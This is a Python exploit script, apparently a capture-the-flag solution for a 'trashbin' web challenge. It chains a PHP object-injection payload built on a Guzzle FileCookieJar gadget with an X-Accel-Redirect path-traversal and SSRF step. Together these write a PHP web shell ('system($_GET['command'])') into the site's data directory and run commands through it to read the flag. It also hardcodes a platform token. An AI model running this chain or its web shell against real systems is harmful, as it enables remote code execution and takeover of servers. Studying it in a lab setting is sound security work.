#!/bin/python3

import json
import logging
import os
import random
import string

import requests

logging.disable()

INSTANCER_TOKEN = 'ifdo8rwye874awpe87ewr8a64akg4a873w4tkdsgziWA'

# Per le challenge web
URL = os.environ.get("URL", "http://trashbin.challs.teamitaly.eu")
if URL.endswith("/"):
    URL = URL[:-1]

INSTANCER_URL = None
res = requests.get(URL)
if 'You are missing a token in your link, go back to the CTF platform!' in res.text:
    res = requests.post(f'{URL}/launch', json={
        'pow': '0',
        'teamToken': INSTANCER_TOKEN
    })

    INSTANCER_URL = URL
    URL = 'http://' + res.json()['urls'][0]

    print('waiting for instance to spawn...')

    while True:
        res = requests.get(URL)
        if res.status_code == 200:
            break

    print('spawned instance')

session1 = requests.Session()
session2 = requests.Session()

backdoor_name = ''.join(random.choices(string.ascii_letters, k=32)) + '.php'

# Register attack user
session1.post(f'{URL}', data={
    'username': b'****id|s:36:"c6c6742d-3616-4bd1-9340-44eae65eb08b";pwn|O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{s:36:"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies";a:1:{i:0;O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{s:33:"\x00GuzzleHttp\\Cookie\\SetCookie\x00data";a:10:{s:4:"Name";s:6:"custom";s:5:"Value";s:3:"asd";s:6:"Domain";s:11:"example.com";s:4:"Path";s:1:"/";s:7:"Max-Age";N;s:7:"Expires";N;s:6:"Secure";b:0;s:7:"Discard";b:0;s:8:"HttpOnly";b:0;s:6:"custom";s:34:"<?php system($_GET[\'command\']); ?>";}}}s:39:"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode";b:0;s:41:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename";s:' + str(
        23 + len(
            backdoor_name)).encode() + b':"/app/trashbin/src/data/' + backdoor_name.encode() + b'";s:52:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies";b:1;};username|s:95:"****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a****a'
})

# Register helper user
res = session2.post(f'{URL}', data={
    'username': 'pianka'
})

# Set response headers
session2.post(res.url, data={
    'response': 'Thank you for your trash!',
    'headers': json.dumps({
        'X-Accel-Redirect': f'/internal/rotate_logs.php?id=/b/../../../../../tmp/sess_{session1.cookies["PHPSESSID"]}'
    })
})

# SSRF
session2.get(res.url.replace('/m/', '/b/'))

# Install backdoor
session1.get(URL)

# RCE
res = session1.get(f'{URL}/data/{backdoor_name}?command=/readflag')
print(res.text)
